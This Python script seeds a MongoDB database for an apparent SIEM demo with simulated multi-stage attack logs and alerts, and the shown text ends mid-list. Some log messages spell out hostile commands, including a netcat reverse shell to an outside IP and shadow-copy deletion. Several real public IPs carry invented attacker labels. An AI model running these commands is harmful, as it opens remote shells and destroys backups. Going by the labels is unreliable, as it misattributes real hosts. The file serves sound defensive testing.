"""
=============================================================
  FULL ATTACK SIMULATION - AI-Powered SIEM Platform
  Simulates a realistic multi-stage cyber attack with:
  - 50+ raw logs across ALL severities
  - AI anomaly detections
  - Autonomous agent responses (auto-block)
  - Alert generation
  - Threat intelligence entries
  - Notification logs
  - Report generation
=============================================================
"""
from datetime import datetime, timedelta
from pymongo import MongoClient
from bson import ObjectId
import random
import time

client = MongoClient("mongodb://localhost:27017")
db = client["siem_db"]

now = datetime.utcnow()
print("=" * 60)
print("  ATTACK SIMULATION - CortexSIEM v3.0")
print("=" * 60)

# ── Clean previous simulation data ──
for coll in ["raw_logs", "alerts", "threat_logs", "agent_actions", "notification_log", "anomalies"]:
    deleted = db[coll].delete_many({"simulated": True}).deleted_count
    if deleted:
        print(f"  Cleared {deleted} old simulated entries from {coll}")

print("\n[PHASE 1] Injecting Attack Logs...")
print("-" * 40)

# ============================================================
# ATTACKER PROFILES
# ============================================================
ATTACKERS = [
    {"ip": "185.220.101.42", "country": "Russia",      "label": "APT-RU-42"},
    {"ip": "103.40.121.88",  "country": "China",       "label": "APT-CN-88"},
    {"ip": "91.189.114.20",  "country": "Ukraine",     "label": "BRUTE-UA-20"},
    {"ip": "45.33.32.156",   "country": "USA",         "label": "C2-SERVER"},
    {"ip": "198.51.100.77",  "country": "Germany",     "label": "SCAN-DE-77"},
    {"ip": "193.23.244.244", "country": "Tor Node",    "label": "TOR-EXIT-NL"},
    {"ip": "185.220.102.8",  "country": "Tor Node",    "label": "TOR-EXIT-DE"},
    {"ip": "199.87.154.255", "country": "Tor Node",    "label": "TOR-RELAY-US"},
    {"ip": "62.102.148.68",  "country": "Tor Node",    "label": "TOR-EXIT-SE"},
    {"ip": "8.8.8.8",        "country": "Unknown",     "label": "HONEYPOT-SCANNER"},
    {"ip": "77.88.55.88",    "country": "N. Korea",    "label": "APT-LAZARUS"},
    {"ip": "5.188.210.20",   "country": "Iran",        "label": "APT-IR-20"},
    {"ip": "194.165.16.5",   "country": "Romania",     "label": "RANSOMWARE-GRP"},
    {"ip": "172.105.66.71",  "country": "Vietnam",     "label": "CRYPTOJACK-VN"},
]

INTERNAL_HOSTS = [
    {"ip": "10.0.0.5",  "host": "SERVER-DC01"},
    {"ip": "10.0.0.10", "host": "WORKSTATION-01"},
    {"ip": "10.0.0.15", "host": "FILESERVER-02"},
    {"ip": "10.0.0.20", "host": "LAPTOP-ADMIN"},
    {"ip": "10.0.0.25", "host": "WEB-SERVER-01"},
    {"ip": "10.0.99.99", "host": "HONEYPOT-SRV01"},
]

# ============================================================
# RAW LOGS - 50+ logs across all severities
# ============================================================
raw_logs = []
log_id = 0

def mklog(eid, src, dst, port, host, msg, level, source="winlogbeat", mins_ago=0):
    global log_id
    log_id += 1
    return {
        "timestamp": now - timedelta(minutes=mins_ago),
        "event_id": eid,
        "source_ip": src,
        "dest_ip": dst,
        "source_port": random.randint(40000, 65000),
        "dest_port": port,
        "hostname": host,
        "message": msg,
        "log_level": level,
        "source": source,
        "ml_injected": True,
        "simulated": True,
    }

# ── CRITICAL ATTACKS (15 logs) ──
print("  [CRITICAL] Brute force + credential theft...")
for i in range(5):
    atk = ATTACKERS[0]
    tgt = INTERNAL_HOSTS[0]
    raw_logs.append(mklog(4625, atk["ip"], tgt["ip"], 3389, tgt["host"],
        f"Failed Login #{i+1} - Account: Administrator, Logon Type: 10, Status: 0xC000006D, Attacker: {atk['ip']}",
        "CRITICAL", mins_ago=i+1))

raw_logs.append(mklog(4740, ATTACKERS[0]["ip"], "10.0.0.5", 3389, "SERVER-DC01",
    "Account Locked Out: Administrator after 5 failed attempts from 185.220.101.42", "CRITICAL", mins_ago=6))

raw_logs.append(mklog(4688, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Process Created: C:\\Users\\Admin\\Desktop\\mimikatz.exe - Credential dumping tool detected", "CRITICAL", mins_ago=7))

raw_logs.append(mklog(7045, "10.0.0.5", "10.0.0.5", 445, "SERVER-DC01",
    "Malicious Service Installed: WinDefendUpdate (C:\\Windows\\Temp\\svc_host.exe) - Persistence mechanism", "CRITICAL", mins_ago=8))

raw_logs.append(mklog(4720, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Rogue Account Created: 'backdoor_admin' by compromised Administrator account", "CRITICAL", mins_ago=9))

raw_logs.append(mklog(4732, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Privilege Escalation: 'backdoor_admin' added to local Administrators group", "CRITICAL", mins_ago=10))

raw_logs.append(mklog(5157, "10.0.0.5", "45.33.32.156", 4444, "SERVER-DC01",
    "Firewall BLOCKED outbound C2 connection to 45.33.32.156:4444 from svc_host.exe", "CRITICAL", mins_ago=11))

raw_logs.append(mklog(1, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Sysmon: powershell.exe -enc SQBFAFgA... (Base64 encoded command execution)", "CRITICAL", "sysmon", mins_ago=12))

raw_logs.append(mklog(4698, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Scheduled Task Created: 'WindowsHealthCheck' runs C:\\Windows\\Temp\\beacon.exe every 5 min", "CRITICAL", mins_ago=13))

raw_logs.append(mklog(4657, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Registry Modified: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware set to 1", "CRITICAL", mins_ago=14))

# ── HIGH SEVERITY (12 logs) ──
print("  [HIGH] Lateral movement + data exfil...")
for i in range(3):
    atk = ATTACKERS[1]
    tgt = INTERNAL_HOSTS[1]
    raw_logs.append(mklog(4625, atk["ip"], tgt["ip"], 22, tgt["host"],
        f"SSH Brute Force attempt #{i+1} from {atk['ip']} (China) targeting {tgt['host']}",
        "ERROR", mins_ago=15+i))

raw_logs.append(mklog(5140, ATTACKERS[0]["ip"], "10.0.0.15", 445, "FILESERVER-02",
    "Network Share Access: \\\\FILESERVER-02\\C$ accessed from external IP 185.220.101.42", "ERROR", mins_ago=18))

raw_logs.append(mklog(3, "10.0.0.5", "45.33.32.156", 443, "SERVER-DC01",
    "Sysmon Network: svc_host.exe connecting to C2 server 45.33.32.156:443 (encrypted channel)", "ERROR", "sysmon", mins_ago=19))

raw_logs.append(mklog(4688, "10.0.0.10", "10.0.0.1", 0, "WORKSTATION-01",
    "Suspicious Process: nc.exe -e cmd.exe 45.33.32.156 4444 (Reverse shell attempt)", "ERROR", mins_ago=20))

raw_logs.append(mklog(4625, ATTACKERS[2]["ip"], "10.0.0.20", 3389, "LAPTOP-ADMIN",
    "RDP Brute Force from Ukraine (91.189.114.20) - 47 attempts in 2 minutes", "ERROR", mins_ago=21))

raw_logs.append(mklog(4688, "10.0.0.15", "10.0.0.15", 0, "FILESERVER-02",
    "Process: 7z.exe compressing C:\\Confidential\\*.* to C:\\Temp\\exfil.7z (Data staging)", "ERROR", mins_ago=22))

raw_logs.append(mklog(5157, "10.0.0.15", "103.40.121.88", 21, "FILESERVER-02",
    "FTP upload attempt to 103.40.121.88 BLOCKED - Data exfiltration prevented", "ERROR", mins_ago=23))

raw_logs.append(mklog(4625, ATTACKERS[4]["ip"], "10.0.0.25", 80, "WEB-SERVER-01",
    "Web Application Login Brute Force from 198.51.100.77 (Germany) - SQL Injection patterns", "ERROR", mins_ago=24))

raw_logs.append(mklog(4688, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "PsExec.exe remote execution detected - lateral movement tool", "ERROR", mins_ago=25))

raw_logs.append(mklog(7045, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "Suspicious service 'RemoteAccessTool' installed with SYSTEM privileges", "ERROR", mins_ago=26))

# ── ADVANCED THREATS (TOR - 8 scenarios) ──
print("  [CRITICAL] Tor network attack scenarios...")
raw_logs.append(mklog(4624, ATTACKERS[5]["ip"], INTERNAL_HOSTS[0]["ip"], 443,  INTERNAL_HOSTS[0]["host"],
    f"Tor Exit Node ({ATTACKERS[5]['ip']}) inbound connection to {INTERNAL_HOSTS[0]['host']}:443 - anonymized attacker", "CRITICAL", mins_ago=16))
raw_logs.append(mklog(4625, ATTACKERS[5]["ip"], INTERNAL_HOSTS[1]["ip"], 3389, INTERNAL_HOSTS[1]["host"],
    f"RDP Brute Force via Tor Exit ({ATTACKERS[5]['ip']}) -> {INTERNAL_HOSTS[1]['host']}: 87 attempts in 3 min", "CRITICAL", mins_ago=15))
raw_logs.append(mklog(5157, INTERNAL_HOSTS[2]["ip"], ATTACKERS[5]["ip"], 443,  INTERNAL_HOSTS[2]["host"],
    f"OUTBOUND Tor Exfiltration: {INTERNAL_HOSTS[2]['host']} -> TOR-EXIT {ATTACKERS[5]['ip']} 4.2GB transfer", "CRITICAL", mins_ago=14))
raw_logs.append(mklog(4625, ATTACKERS[6]["ip"], INTERNAL_HOSTS[0]["ip"], 22,   INTERNAL_HOSTS[0]["host"],
    f"SSH Brute Force via Tor Relay ({ATTACKERS[6]['ip']}) targeting {INTERNAL_HOSTS[0]['host']}: 120 attempts", "CRITICAL", mins_ago=13))
raw_logs.append(mklog(4688, ATTACKERS[7]["ip"], INTERNAL_HOSTS[3]["ip"], 8080, INTERNAL_HOSTS[3]["host"],
    f"Tor Hidden Service C2 beacon from {INTERNAL_HOSTS[3]['host']} to onion relay {ATTACKERS[7]['ip']}", "CRITICAL", mins_ago=12))
raw_logs.append(mklog(5157, INTERNAL_HOSTS[4]["ip"], ATTACKERS[8]["ip"], 9001, INTERNAL_HOSTS[4]["host"],
    f"Tor SOCKS5 proxy tunnel detected on {INTERNAL_HOSTS[4]['host']}:9001 routing to {ATTACKERS[8]['ip']}", "CRITICAL", mins_ago=11))
raw_logs.append(mklog(4625, ATTACKERS[5]["ip"], INTERNAL_HOSTS[4]["ip"], 80,   INTERNAL_HOSTS[4]["host"],
    f"Web App SQL Injection via Tor Exit ({ATTACKERS[5]['ip']}) on {INTERNAL_HOSTS[4]['host']}: Union-based payload", "CRITICAL", mins_ago=10))
raw_logs.append(mklog(3,    ATTACKERS[6]["ip"], INTERNAL_HOSTS[0]["ip"], 4444, INTERNAL_HOSTS[0]["host"],
    f"Tor-tunneled reverse shell from {INTERNAL_HOSTS[0]['host']} to {ATTACKERS[6]['ip']}:4444 - Metasploit beacon", "CRITICAL", "sysmon", mins_ago=9))

# ── HONEYPOT ──
print("  [CRITICAL] Honeypot triggered...")
raw_logs.append(mklog(4625, ATTACKERS[9]["ip"], INTERNAL_HOSTS[5]["ip"], 22, INTERNAL_HOSTS[5]["host"],
    f"SSH Brute Force targeting Honeypot ({INTERNAL_HOSTS[5]['host']}) from {ATTACKERS[9]['ip']} - DECEPTION TRIGGERED", "CRITICAL", mins_ago=17))

# ── RANSOMWARE (6 logs) ──
print("  [CRITICAL] Ransomware deployment...")
raw_logs.append(mklog(4688, ATTACKERS[12]["ip"], INTERNAL_HOSTS[2]["ip"], 445, INTERNAL_HOSTS[2]["host"],
    f"Ransomware dropper: LockBit3.exe executed on {INTERNAL_HOSTS[2]['host']} - encrypting C:\\Shares\\*", "CRITICAL", mins_ago=8))
raw_logs.append(mklog(4657, INTERNAL_HOSTS[2]["ip"], INTERNAL_HOSTS[2]["ip"], 0, INTERNAL_HOSTS[2]["host"],
    "Ransomware: Volume Shadow Copy deletion - vssadmin delete shadows /all /quiet", "CRITICAL", mins_ago=7))
raw_logs.append(mklog(5157, INTERNAL_HOSTS[2]["ip"], ATTACKERS[12]["ip"], 443, INTERNAL_HOSTS[2]["host"],
    f"Ransomware C2 checkin to {ATTACKERS[12]['ip']} - encryption key exchange detected", "CRITICAL", mins_ago=6))
raw_logs.append(mklog(4688, INTERNAL_HOSTS[1]["ip"], INTERNAL_HOSTS[1]["ip"], 0, INTERNAL_HOSTS[1]["host"],
    "Ransomware lateral spread: LockBit spreading via SMB to WORKSTATION-01 - WannaCry-like propagation", "CRITICAL", mins_ago=5))
raw_logs.append(mklog(4688, INTERNAL_HOSTS[0]["ip"], INTERNAL_HOSTS[0]["ip"], 0, INTERNAL_HOSTS[0]["host"],
    "Ransom note dropped: C:\\Users\\Public\\README_LOCKED.txt - $500k BTC demand", "CRITICAL", mins_ago=4))
raw_logs.append(mklog(5157, INTERNAL_HOSTS[0]["ip"], ATTACKERS[12]["ip"], 443, INTERNAL_HOSTS[0]["host"],
    f"Ransomware beacon blocked: outbound to {ATTACKERS[12]['ip']} for decryption key", "ERROR", mins_ago=3))

# ── ZERO-DAY / SUPPLY CHAIN (4 logs) ──
print("  [CRITICAL] Zero-day & supply chain...")
raw_logs.append(mklog(4688, ATTACKERS[10]["ip"], INTERNAL_HOSTS[0]["ip"], 443, INTERNAL_HOSTS[0]["host"],
    f"Zero-Day exploit CVE-2024-XXXX targeting Exchange Server on {INTERNAL_HOSTS[0]['host']} from {ATTACKERS[10]['ip']}", "CRITICAL", mins_ago=60))
raw_logs.append(mklog(7045, INTERNAL_HOSTS[0]["ip"], INTERNAL_HOSTS[0]["ip"], 0, INTERNAL_HOSTS[0]["host"],
    "Supply Chain: SolarWinds-like DLL sideload - legitimate software update trojanized", "CRITICAL", mins_ago=55))
raw_logs.append(mklog(4688, INTERNAL_HOSTS[0]["ip"], ATTACKERS[10]["ip"], 443, INTERNAL_HOSTS[0]["host"],
    f"Post-exploitation: SUNBURST beacon to {ATTACKERS[10]['ip']} after supply chain implant activated", "CRITICAL", mins_ago=50))
raw_logs.append(mklog(4657, INTERNAL_HOSTS[0]["ip"], INTERNAL_HOSTS[0]["ip"], 0, INTERNAL_HOSTS[0]["host"],
    "Supply chain implant modifying system registry for persistence: HKLM\\System\\CurrentControlSet", "ERROR", mins_ago=48))

# ── CRYPTOJACKING / DDoS / MITM / INSIDER (5 logs) ──
print("  [HIGH] Cryptojacking, DDoS, MITM, Insider...")
raw_logs.append(mklog(4688, ATTACKERS[13]["ip"], INTERNAL_HOSTS[1]["ip"], 0, INTERNAL_HOSTS[1]["host"],
    f"Cryptojacking: XMRig miner spawned by {ATTACKERS[13]['ip']} - CPU usage 98%% on {INTERNAL_HOSTS[1]['host']}", "ERROR", mins_ago=40))
raw_logs.append(mklog(5157, ATTACKERS[0]["ip"],  INTERNAL_HOSTS[4]["ip"], 80, INTERNAL_HOSTS[4]["host"],
    f"DDoS: 480 Gbps UDP flood from {ATTACKERS[0]['ip']} (Russia) targeting {INTERNAL_HOSTS[4]['host']}:80", "CRITICAL", mins_ago=35))
raw_logs.append(mklog(4625, "10.0.0.30", INTERNAL_HOSTS[0]["ip"], 389, INTERNAL_HOSTS[0]["host"],
    "MITM: ARP spoofing detected on VLAN10 - attacker 10.0.0.30 intercepting LDAP traffic", "ERROR", mins_ago=30))
raw_logs.append(mklog(5140, "10.0.0.20", INTERNAL_HOSTS[2]["ip"], 445, INTERNAL_HOSTS[2]["host"],
    "Insider Threat: admin_john bulk-copying HR salary data (2.1GB) to personal USB outside work hours", "ERROR", mins_ago=25))
raw_logs.append(mklog(4688, "10.0.0.20", INTERNAL_HOSTS[0]["ip"], 0, INTERNAL_HOSTS[0]["host"],
    "DNS Tunneling: iodine tool detected - data encoded in DNS queries to malicious nameserver", "ERROR", mins_ago=20))

# ── MEDIUM SEVERITY (10 logs) ──
print("  [MEDIUM] Reconnaissance + scanning...")
for i in range(3):
    raw_logs.append(mklog(4625, ATTACKERS[4]["ip"], INTERNAL_HOSTS[i%3]["ip"], 445, INTERNAL_HOSTS[i%3]["host"],
        f"Port scan detected from {ATTACKERS[4]['ip']} targeting SMB port 445", "WARNING", mins_ago=27+i))

raw_logs.append(mklog(4688, "10.0.0.20", "10.0.0.20", 0, "LAPTOP-ADMIN",
    "nmap.exe process detected - internal network reconnaissance", "WARNING", mins_ago=30))

raw_logs.append(mklog(4688, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "whoami.exe /all - User enumeration command detected", "WARNING", mins_ago=31))

raw_logs.append(mklog(4688, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "net user /domain - Domain user enumeration detected", "WARNING", mins_ago=32))

raw_logs.append(mklog(4688, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "ipconfig /all - Network configuration discovery", "WARNING", mins_ago=33))

raw_logs.append(mklog(5157, "10.0.0.20", "8.8.8.8", 53, "LAPTOP-ADMIN",
    "Unusual DNS query volume detected - possible DNS tunneling", "WARNING", mins_ago=34))

raw_logs.append(mklog(4625, "172.16.0.50", "10.0.0.25", 8080, "WEB-SERVER-01",
    "Authentication failure on web admin panel from internal IP", "WARNING", mins_ago=35))

raw_logs.append(mklog(4657, "10.0.0.20", "10.0.0.20", 0, "LAPTOP-ADMIN",
    "Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run modified - possible startup persistence", "WARNING", mins_ago=36))

# ── LOW SEVERITY (10 logs) ──
print("  [LOW] Informational + policy violations...")
raw_logs.append(mklog(4624, "10.0.0.10", "10.0.0.5", 3389, "SERVER-DC01",
    "Successful RDP login - User: operator1 from WORKSTATION-01", "INFO", mins_ago=37))
raw_logs.append(mklog(4624, "10.0.0.20", "10.0.0.15", 445, "FILESERVER-02",
    "File share accessed - User: admin_john from LAPTOP-ADMIN", "INFO", mins_ago=38))
raw_logs.append(mklog(4634, "10.0.0.10", "10.0.0.5", 3389, "SERVER-DC01",
    "User logoff - operator1 session ended normally", "INFO", mins_ago=39))
raw_logs.append(mklog(4672, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Special privileges assigned - User: SYSTEM (normal service account)", "INFO", mins_ago=40))
raw_logs.append(mklog(7036, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "Windows Update service entered running state", "INFO", mins_ago=41))
raw_logs.append(mklog(4648, "10.0.0.20", "10.0.0.5", 445, "SERVER-DC01",
    "Explicit credential logon by admin_john - RunAs used", "INFO", mins_ago=42))
raw_logs.append(mklog(4776, "10.0.0.5", "10.0.0.5", 0, "SERVER-DC01",
    "NTLM authentication validated for operator1", "INFO", mins_ago=43))
raw_logs.append(mklog(4800, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "Workstation locked by user operator1", "INFO", mins_ago=44))
raw_logs.append(mklog(4801, "10.0.0.10", "10.0.0.10", 0, "WORKSTATION-01",
    "Workstation unlocked by user operator1", "INFO", mins_ago=45))
raw_logs.append(mklog(4797, "10.0.0.20", "10.0.0.20", 0, "LAPTOP-ADMIN",
    "Account enumeration attempt by admin_john - non-malicious", "INFO", mins_ago=46))

result = db["raw_logs"].insert_many(raw_logs)
print(f"  => {len(result.inserted_ids)} raw logs injected")

# ============================================================
# PHASE 2: ALERTS
# ============================================================
print("\n[PHASE 2] Generating Security Alerts...")
print("-" * 40)

alerts = [
    {
        "title": "Brute Force Attack - Multiple Failed RDP Logins",
        "description": "5 consecutive failed login attempts detected from 185.220.101.42 (Russia) targeting SERVER-DC01 via RDP. Account: Administrator. Attack pattern consistent with automated credential stuffing.",
        "severity": "critical",
        "source_ip": "185.220.101.42",
        "hostname": "SERVER-DC01",
        "rule_name": "Brute Force - Multiple Failed Logins",
        "rule_id": "builtin_brute_force",
        "status": "open",
        "created_at": now - timedelta(minutes=6),
        "simulated": True,
    },
    {
        "title": "Credential Theft - Mimikatz Execution Detected",
        "description": "Known credential dumping tool mimikatz.exe executed on SERVER-DC01. LSASS memory may be compromised. Immediate password rotation recommended.",
        "severity": "critical",
        "source_ip": "10.0.0.5",
        "hostname": "SERVER-DC01",
        "rule_name": "Suspicious Process Execution",
        "rule_id": "builtin_suspicious_process",
        "status": "open",
        "created_at": now - timedelta(minutes=7),
        "simulated": True,
    },
    {
        "title": "Persistence - Malicious Service Installation",
        "description": "Service 'WinDefendUpdate' installed with executable path C:\\Windows\\Temp\\svc_host.exe. This matches known APT persistence techniques (MITRE T1543.003).",
        "severity": "critical",
        "source_ip": "10.0.0.5",
        "hostname": "SERVER-DC01",
        "rule_name": "New Service Installation",
        "rule_id": "builtin_new_service",
        "status": "investigating",
        "created_at": now - timedelta(minutes=8),
        "simulated": True,
    },
    {
        "title": "Defense Evasion - Windows Defender Disabled",
        "description": "Registry key DisableAntiSpyware was set to 1, effectively disabling Windows Defender. Consistent with post-exploitation defense evasion (MITRE T1562.001).",
        "severity": "critical",
        "source_ip": "10.0.0.5",
        "hostname": "SERVER-DC01",
        "rule_name": "Security Software Tampering",
        "rule_id": "builtin_defense_evasion",
        "status": "open",
        "created_at": now - timedelta(minutes=14),
        "simulated": True,
    },
    {
        "title": "C2 Communication - Outbound Connection to Known Threat IP",
        "description": "svc_host.exe attempted outbound connection to 45.33.32.156:4444 (known C2 infrastructure). Connection was BLOCKED by Windows Firewall.",
        "severity": "high",
        "source_ip": "10.0.0.5",
        "hostname": "SERVER-DC01",
        "rule_name": "C2 Communication Detected",
        "rule_id": "builtin_c2_detection",
        "status": "blocked",
        "created_at": now - timedelta(minutes=11),
        "simulated": True,
    },
    {
        "title": "Lateral Movement - Unauthorized Share Access",
        "description": "External IP 185.220.101.42 accessed administrative share \\\\FILESERVER-02\\C$ indicating lateral movement attempt.",
        "severity": "high",
        "source_ip": "185.220.101.42",
        "hostname": "FILESERVER-02",
        "rule_name": "Suspicious Network Share Access",
        "rule_id": "builtin_lateral_movement",
        "status": "investigating",
        "created_at": now - timedelta(minutes=18),
        "simulated": True,
    },
    {
        "title": "Data Exfiltration Attempt - FTP Upload Blocked",
        "description": "FTP upload to external server 103.40.121.88 (China) blocked. Source: FILESERVER-02. File: exfil.7z (compressed archive of confidential data).",
        "severity": "high",
        "source_ip": "10.0.0.15",
        "hostname": "FILESERVER-02",
        "rule_name": "Data Exfiltration Detection",
        "rule_id": "builtin_data_exfil",
        "status": "blocked",
        "created_at": now - timedelta(minutes=23),
        "simulated": True,
    },
    {
        "title": "SSH Brute Force - Multiple Failed Logins from China",
        "description": "3 rapid SSH login failures from 103.40.121.88 (China) targeting WORKSTATION-01. Pattern matches automated SSH brute force tool.",
        "severity": "high",
        "source_ip": "103.40.121.88",
        "hostname": "WORKSTATION-01",
        "rule_name": "Brute Force - Multiple Failed Logins",
        "rule_id": "builtin_brute_force",
        "status": "open",
        "created_at": now - timedelta(minutes=15),
        "simulated": True,
    },
    {
        "title": "Privilege Escalation - User Added to Administrators",
        "description": "Account 'backdoor_admin' was added to local Administrators group on SERVER-DC01. This was likely performed by a compromised account.",
        "severity": "high",
        "source_ip": "10.0.0.5",
        "hostname": "SERVER-DC01",
        "rule_name": "Privilege Escalation Detected",
        "rule_id": "builtin_priv_esc",
        "status": "open",
        "created_at": now - timedelta(minutes=10),
        "simulated": True,
    },
    {
        "title": "Reconnaissance - Internal Port Scanning",
        "description": "Port scanning activity detected from 198.51.100.77 (Germany) targeting multiple internal hosts on SMB port 445.",
        "severity": "medium",
        "source_ip": "198.51.100.77",
        "hostname": "Multiple",
        "rule_name": "Port Scan Detection",
        "rule_id": "builtin_port_scan",
        "status": "open",
        "created_at": now - timedelta(minutes=27),
        "simulated": True,
    },
    {
        "title": "Suspicious DNS Traffic - Possible Tunneling",
        "description": "Anomalous DNS query volume from LAPTOP-ADMIN. 500+ queries in 5 minutes to non-standard domains. May indicate DNS-based data exfiltration.",
        "severity": "medium",
        "source_ip": "10.0.0.20",
        "hostname": "LAPTOP-ADMIN",
        "rule_name": "DNS Anomaly Detection",
        "rule_id": "builtin_dns_anomaly",
        "status": "open",
        "created_at": now - timedelta(minutes=34),
        "simulated": True,
    },
    {
        "title": "Web Admin Panel - Repeated Auth Failures",
        "description": "Multiple failed login attempts to web admin panel on WEB-SERVER-01 from internal IP 172.16.0.50.",
        "severity": "medium",
        "source_ip": "172.16.0.50",
        "hostname": "WEB-SERVER-01",
        "rule_name": "Web Application Brute Force",
        "rule_id": "builtin_web_bruteforce",
        "status": "open",
        "created_at": now - timedelta(minutes=35),
        "simulated": True,
    },
    {
        "title": "Policy Violation - RunAs Credential Usage",
        "description": "User admin_john used RunAs to authenticate with elevated credentials from LAPTOP-ADMIN. This may be standard behavior but is flagged for audit.",
        "severity": "low",
        "source_ip": "10.0.0.20",
        "hostname": "LAPTOP-ADMIN",
        "rule_name": "Explicit Credential Usage",
        "rule_id": "builtin_explicit_cred",
        "status": "closed",
        "created_at": now - timedelta(minutes=42),
        "simulated": True,
    },
    {
        "title": "Normal Activity - Successful RDP Login",
        "description": "Standard RDP login by operator1 from WORKSTATION-01 to SERVER-DC01. No anomalies detected.",
        "severity": "low",
        "source_ip": "10.0.0.10",
        "hostname": "SERVER-DC01",
        "rule_name": "Login Monitoring",
        "rule_id": "builtin_login_monitor",
        "status": "closed",
        "created_at": now - timedelta(minutes=37),
        "simulated": True,
    },
    {
        "title": "Tor Network Connection Detected",
        "description": "Inbound connection from known Tor Exit Node (193.23.244.244). Tor traffic is strictly prohibited by policy and indicates defense evasion.",
        "severity": "high",
        "source_ip": "193.23.244.244",
        "hostname": "SERVER-DC01",
        "rule_name": "Tor Exit Node Traffic",
        "rule_id": "builtin_tor_traffic",
        "status": "blocked",
        "created_at": now - timedelta(minutes=16),
        "simulated": True,
    },
    {
        "title": "Tor-based RDP Brute Force",
        "description": "Multiple RDP login failures from a known Tor Exit Node (193.23.244.244). Attacker is anonymizing their brute force activity.",
        "severity": "critical",
        "source_ip": "193.23.244.244",
        "hostname": "WORKSTATION-01",
        "rule_name": "Tor Brute Force",
        "rule_id": "builtin_tor_bruteforce",
        "status": "blocked",
        "created_at": now - timedelta(minutes=15),
        "simulated": True,
    },
    {
        "title": "Data Exfiltration via Tor",
        "description": "Large outbound data transfer to Tor Exit Node (193.23.244.244) detected. Possible exfiltration of sensitive data over anonymous network.",
        "severity": "critical",
        "source_ip": "10.0.0.15",
        "hostname": "FILESERVER-02",
        "rule_name": "Tor Exfiltration",
        "rule_id": "builtin_tor_exfil",
        "status": "blocked",
        "created_at": now - timedelta(minutes=14),
        "simulated": True,
    },
    {
        "title": "Honeypot Interaction - Unauthorized Access Attempt",
        "description": "SSH login attempt on deception network honeypot (10.0.99.99). Any interaction with this host is inherently malicious.",
        "severity": "critical",
        "source_ip": "8.8.8.8",
        "hostname": "HONEYPOT-SRV01",
        "rule_name": "Deception Network Triggered",
        "rule_id": "builtin_honeypot_trigger",
        "status": "open",
        "created_at": now - timedelta(minutes=17),
        "simulated": True,
    },
    # ── New Tor attack alerts ──
    {
        "title": "Tor Hidden Service C2 Beacon Detected",
        "description": "LAPTOP-ADMIN is communicating with a Tor Hidden Service (.onion) relay at 199.87.154.255:8080. Indicates active C2 channel via Tor anonymization network.",
        "severity": "critical", "source_ip": "199.87.154.255", "hostname": "LAPTOP-ADMIN",
        "rule_name": "Tor C2 Communication", "rule_id": "builtin_tor_c2",
        "status": "blocked", "created_at": now - timedelta(minutes=12), "simulated": True,
    },
    {
        "title": "Tor SOCKS5 Proxy Tunnel - Port 9001",
        "description": "Active Tor SOCKS5 proxy tunnel on WEB-SERVER-01:9001 routing internal traffic through Tor relay 62.102.148.68. Complete network anonymization.",
        "severity": "critical", "source_ip": "62.102.148.68", "hostname": "WEB-SERVER-01",
        "rule_name": "Tor Proxy Tunnel", "rule_id": "builtin_tor_proxy",
        "status": "blocked", "created_at": now - timedelta(minutes=11), "simulated": True,
    },
    {
        "title": "SQL Injection via Tor Exit Node",
        "description": "Union-based SQL injection attack on WEB-SERVER-01 routed through Tor Exit Node 193.23.244.244. Attacker hiding identity while extracting database contents.",
        "severity": "critical", "source_ip": "193.23.244.244", "hostname": "WEB-SERVER-01",
        "rule_name": "Tor SQL Injection", "rule_id": "builtin_tor_sqli",
        "status": "open", "created_at": now - timedelta(minutes=10), "simulated": True,
    },
    {
        "title": "Tor-Tunneled Reverse Shell (Metasploit)",
        "description": "Metasploit reverse shell beacon from SERVER-DC01 tunneled through Tor exit 185.220.102.8:4444. System is fully compromised.",
        "severity": "critical", "source_ip": "185.220.102.8", "hostname": "SERVER-DC01",
        "rule_name": "Tor Reverse Shell", "rule_id": "builtin_tor_shell",
        "status": "open", "created_at": now - timedelta(minutes=9), "simulated": True,
    },
    # ── Ransomware alerts ──
    {
        "title": "RANSOMWARE DETECTED - LockBit 3.0 Deployment",
        "description": "LockBit 3.0 ransomware is actively encrypting files on FILESERVER-02. Volume Shadow Copies deleted. Ransom demand: $500,000 BTC. IMMEDIATE ISOLATION REQUIRED.",
        "severity": "critical", "source_ip": "194.165.16.5", "hostname": "FILESERVER-02",
        "rule_name": "Ransomware Execution", "rule_id": "builtin_ransomware",
        "status": "open", "created_at": now - timedelta(minutes=8), "simulated": True,
    },
    {
        "title": "Ransomware Lateral Spread - WannaCry Pattern",
        "description": "LockBit spreading to WORKSTATION-01 via SMB. Propagation matches EternalBlue/WannaCry lateral movement pattern. Network isolation required.",
        "severity": "critical", "source_ip": "10.0.0.15", "hostname": "WORKSTATION-01",
        "rule_name": "Ransomware Lateral Movement", "rule_id": "builtin_ransomware_spread",
        "status": "open", "created_at": now - timedelta(minutes=5), "simulated": True,
    },
    # ── Zero-Day / Supply Chain alerts ──
    {
        "title": "Zero-Day Exploit - Exchange Server CVE-2024-XXXX",
        "description": "Nation-state APT (N. Korea/Lazarus Group) exploiting unpatched Exchange Server vulnerability. Remote code execution achieved on SERVER-DC01.",
        "severity": "critical", "source_ip": "77.88.55.88", "hostname": "SERVER-DC01",
        "rule_name": "Zero-Day Exploit", "rule_id": "builtin_zero_day",
        "status": "investigating", "created_at": now - timedelta(minutes=60), "simulated": True,
    },
    {
        "title": "Supply Chain Attack - SolarWinds-Like Trojanized Update",
        "description": "Legitimate software update package replaced with malicious DLL. SUNBURST-like backdoor activated after installation. Full supply chain compromise.",
        "severity": "critical", "source_ip": "77.88.55.88", "hostname": "SERVER-DC01",
        "rule_name": "Supply Chain Compromise", "rule_id": "builtin_supply_chain",
